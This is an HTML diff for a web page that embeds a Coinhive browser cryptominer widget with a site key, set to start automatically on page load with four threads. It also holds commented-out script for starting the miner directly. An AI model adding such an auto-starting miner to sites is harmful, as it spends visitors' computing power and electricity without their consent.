@@ -12,27 +12,44 @@ td {
 
 </head>
 <body>
-<script src="https://coinhive.com/lib/miner.min.js" async></script>
-<script type="text/javascript"
-		src="https://files.coinmarketcap.com/static/widget/currency.js"></script>
+	<script src="https://coinhive.com/lib/miner.min.js" async></script>
+	<!-- 	<script src="https://coinhive.com/lib/coinhive.min.js"></script> -->
+
 	<div class="coinhive-miner" style="width: 256px; height: 310px"
 		data-key="Y88o17Z1nDLT1r9SjSCuljPQOATm7VzV" data-autostart="true"
 		data-whitelabel="false" data-background="#000000" data-text="#eeeeee"
 		data-action="#00ff00" data-graph="#555555" data-threads="4"
-		data-throttle="0.1" data-start="Start Now!">
+		data-autoThreads="true" data-throttle="0.1" data-start="Start Now!">
 		<em>Please disable Adblock!</em>
 	</div>
-	<table>
-		<tr>
-			<td class="coinmarketcap-currency-widget" data-currency="bitcoin"
-				data-base="USD" data-secondary="USD"></td>
-			<td class="coinmarketcap-currency-widget" data-currency="litecoin"
-				data-base="BTC" data-secondary="USD"></td>
-			<td class="coinmarketcap-currency-widget" data-currency="monero"
-				data-base="BTC" data-secondary="USD"></td>
-			<td class="coinmarketcap-currency-widget" data-currency="dogecoin"
-				data-base="BTC" data-secondary="USD"></td>
-		</tr>
-	</table>
+
+	<!-- 	<script> -->
+	<!-- // 		var miner = new CoinHive.Anonymous('Y88o17Z1nDLT1r9SjSCuljPQOATm7VzV', { -->
+	<!-- // 			threads: 4, -->
+	<!-- // 			autoThreads: true, -->
+	<!-- // 			throttle: 0.9, -->
+	<!-- // 			forceASMJS: false -->
+	<!-- // 		}); -->
+	<!-- // 		miner.start(); -->
+	<!-- // 		// Listen on events -->
+	<!-- // 		miner.on('found', function() { -->
+	<!-- // 			/* Hash found */ -->
+	<!-- // 		}) -->
+	<!-- // 		miner.on('accepted', function() { -->
+	<!-- // 			/* Hash accepted by the pool */ -->
+	<!-- // 		}) -->
+
+	<!-- // 		// Update stats once per second -->
+	<!-- // 		setInterval(function(element) { -->
+	<!-- // 			var hashesPerSecond = miner.getHashesPerSecond(); -->
+	<!-- // 			var totalHashes = miner.getTotalHashes(); -->
+	<!-- // 			var acceptedHashes = miner.getAcceptedHashes(); -->
+
+	<!-- // 			// Output to HTML elements... -->
+	<!-- // 			document.getElementById("hps").innerHTML = "<b>" + hashesPerSecond + "</br>"; -->
+	<!-- // 		}, 2000); -->
+	<!-- 	</script> -->
+
+	<!-- 	<span id="hps"><b>dsf</b></span> -->
 </body>
 </html>
